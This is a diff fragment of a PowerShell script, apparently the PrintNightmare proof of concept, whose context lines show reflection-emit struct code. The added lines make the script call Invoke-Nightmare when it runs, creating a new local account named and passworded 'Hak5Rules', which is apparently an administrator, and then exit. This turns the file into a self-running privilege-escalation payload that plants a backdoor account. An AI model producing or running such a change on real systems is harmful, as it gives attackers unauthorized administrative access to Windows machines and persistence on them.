@@ -521,3 +521,7 @@ function struct
     $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
     $StructBuilder.CreateType()
 }
+
+Invoke-Nightmare -DriverName 'Hak5Rules' -NewUser 'Hak5Rules' -NewPassword 'Hak5Rules'
+
+exit
